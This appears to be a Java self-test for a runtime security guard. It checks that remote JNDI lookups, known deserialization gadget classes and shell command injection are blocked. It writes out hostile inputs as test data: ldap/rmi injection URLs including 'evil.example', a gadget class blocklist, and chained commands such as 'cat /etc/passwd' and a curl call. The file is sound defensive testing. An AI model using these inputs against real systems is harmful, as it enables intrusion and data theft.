// SPDX-License-Identifier: BSD-2-Clause
// Copyright (c) 2026 Authors of shirudo

package com.shirudo.runtimeguard;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.InvalidClassException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import javax.management.BadAttributeValueExpException;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * Self-test suite verifying JNDI scheme blocking, gadget ObjectInputStream
 * rejection, ShellExecGuard blocking, benign pass-through, and observe mode.
 */
public final class RuntimeGuardTest {

    private RuntimeGuardTest() {}

    private static byte[] serialize(Object obj) throws Exception {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        try (ObjectOutputStream oos = new ObjectOutputStream(out)) {
            oos.writeObject(obj);
        }
        return out.toByteArray();
    }

    private static Object deserialize(byte[] bytes) throws Exception {
        try (ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(bytes))) {
            return ois.readObject();
        }
    }

    private static void expectJndiBlocked(Context ctx, String url) throws Exception {
        try {
            ctx.lookup(url);
            throw new AssertionError("Expected JNDI block for " + url);
        } catch (SecurityException expected) {
            // blocked as expected
        }
    }

    public static void main(String[] args) throws Exception {
        System.setProperty(GuardMode.MODE_PROPERTY, "enforce");
        InitialContext ctx = new InitialContext();

        // 1. Remote JNDI schemes are blocked with SecurityException.
        expectJndiBlocked(ctx, "ldap://127.0.0.1:1389/Exploit");
        expectJndiBlocked(ctx, "ldaps://evil.example:636/Payload");
        expectJndiBlocked(ctx, "rmi://127.0.0.1:1099/Exploit");
        expectJndiBlocked(ctx, "dns://127.0.0.1/evil.example");
        expectJndiBlocked(ctx, "iiop://127.0.0.1:900/Exploit");
        expectJndiBlocked(ctx, "corba://127.0.0.1/Exploit");

        // 2. Local java:comp/env context lookups and bindings succeed.
        Object envCtx = ctx.lookup("java:comp/env");
        if (!(envCtx instanceof Context)) {
            throw new AssertionError("Expected local java:comp/env Context");
        }
        ctx.bind("java:comp/env/serviceName", "billing-api");
        if (!"billing-api".equals(ctx.lookup("java:comp/env/serviceName"))) {
            throw new AssertionError("Local java:comp/env binding round-trip failed");
        }

        // 3. Gadget deserialization is rejected by the JVM-wide ObjectInputFilter.
        byte[] gadgetBytes = serialize(new BadAttributeValueExpException("gadget"));
        boolean deserRejected = false;
        try {
            deserialize(gadgetBytes);
        } catch (InvalidClassException expected) {
            deserRejected = true;
        }
        if (!deserRejected) {
            throw new AssertionError("Expected gadget deserialization to throw InvalidClassException");
        }
        if (!DeserializationGuard.isBlockedClassName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl")
                || !DeserializationGuard.isBlockedClassName(
                "org.apache.commons.collections.functors.InvokerTransformer")
                || !DeserializationGuard.isBlockedClassName(
                "com.sun.rowset.JdbcRowSetImpl")
                || !DeserializationGuard.isBlockedClassName(
                "org.apache.commons.beanutils.BeanComparator")) {
            throw new AssertionError("Expected canonical gadget classes in blocklist");
        }

        // 4. Benign JDK types serialize and deserialize normally.
        List<String> list = new ArrayList<>(List.of("alpha", "beta"));
        Map<String, Integer> map = new HashMap<>();
        map.put("ok", 200);
        if (!list.equals(deserialize(serialize(list)))
                || !map.equals(deserialize(serialize(map)))) {
            throw new AssertionError("Benign deserialization failed");
        }

        // 5. ShellExecGuard blocks shell wrappers and metacharacters, allows safe argv.
        boolean shellBlocked = false;
        try {
            ShellExecGuard.checkCommand("/bin/sh", "-c", "id; curl http://127.0.0.1");
        } catch (SecurityException expected) {
            shellBlocked = true;
        }
        if (!shellBlocked) {
            throw new AssertionError("Expected /bin/sh -c to be blocked");
        }
        boolean metaBlocked = false;
        try {
            ShellExecGuard.checkCommand("ping -c 1 127.0.0.1 && cat /etc/passwd");
        } catch (SecurityException expected) {
            metaBlocked = true;
        }
        if (!metaBlocked) {
            throw new AssertionError("Expected command chaining metacharacters to be blocked");
        }
        ShellExecGuard.checkCommand("/usr/bin/id", "-u");

        // 6. Observe mode logs and increments counters without throwing SecurityException.
        System.setProperty(GuardMode.MODE_PROPERTY, "observe");
        long obsBefore = GuardMode.observedCount();
        try {
            ctx.lookup("ldap://127.0.0.1:1389/ObserveOnly");
        } catch (NamingException ignored) {
            // NamingException (not SecurityException) avoids real network traffic
        }
        Object obsGadget = deserialize(gadgetBytes);
        if (!(obsGadget instanceof BadAttributeValueExpException)) {
            throw new AssertionError("Observe mode should allow gadget deserialization");
        }
        ShellExecGuard.checkCommand("/bin/bash", "-c", "echo observed");
        if (GuardMode.observedCount() < obsBefore + 3) {
            throw new AssertionError("Observe mode did not increment observedCount for all 3 checks");
        }

        System.setProperty(GuardMode.MODE_PROPERTY, "enforce");
        System.out.println("RuntimeGuardTest: all assertions passed");
    }
}
